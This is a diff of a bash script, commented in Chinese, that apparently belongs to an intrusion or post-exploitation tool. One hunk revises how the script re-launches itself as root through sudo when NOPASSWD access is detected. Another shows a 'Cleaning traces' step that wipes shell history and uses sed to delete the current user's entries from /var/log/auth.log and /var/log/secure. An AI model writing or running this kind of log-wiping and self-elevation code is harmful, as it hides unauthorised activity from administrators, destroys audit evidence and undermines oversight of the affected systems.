@@ -44,21 +44,23 @@ run_task() {
 # 主程序流
 # ============================================================
 
-# --- 身份自切换逻辑 (重点修复) ---
+# --- 身份自切换逻辑 (彻底修复版) ---
 if [ "$(id -u)" -ne 0 ]; then
     printf "${BLUE}[*] Checking privileges for user: %s...${NC}\n" "$ME"
     
     if sudo -l 2>/dev/null | grep -q "NOPASSWD"; then
-        printf "${GREEN}[✔] NOPASSWD detected! Switching to Root...${NC}\n"
-        # 使用 sudo bash 直接启动，不再使用 sudo -i，避免环境冲突
-        exec sudo bash "$0"
+        printf "${GREEN}[✔] NOPASSWD detected! Re-running as Root...${NC}\n"
+        # 【关键修复】：不再使用 exec，直接启动一个 sudo 进程，然后让当前进程 exit
+        sudo bash "$0"
+        exit 0
     else
         printf "${YELLOW}[!] Sudo password required...${NC}\n"
-        exec sudo bash "$0"
+        sudo bash "$0"
+        exit 0
     fi
 fi
 
-# --- 此时身份已是 ROOT ---
+# --- 此时身份已经是 ROOT ---
 printf "${BLUE}[*] Running as ROOT...${NC}\n"
 
 # 执行任务
@@ -74,7 +76,7 @@ fi
 printf "    > Cleaning traces... "
 history -c 2>/dev/null
 [[ -f ~/.bash_history ]] && > ~/.bash_history 2>/dev/null
-# 尝试清理日志 (Root 权限下直接 sed)
+# 尝试清理日志
 sed -i "/$ME/d" /var/log/auth.log 2>/dev/null
 sed -i "/$ME/d" /var/log/secure 2>/dev/null
 printf "${GREEN}DONE${NC}\n"
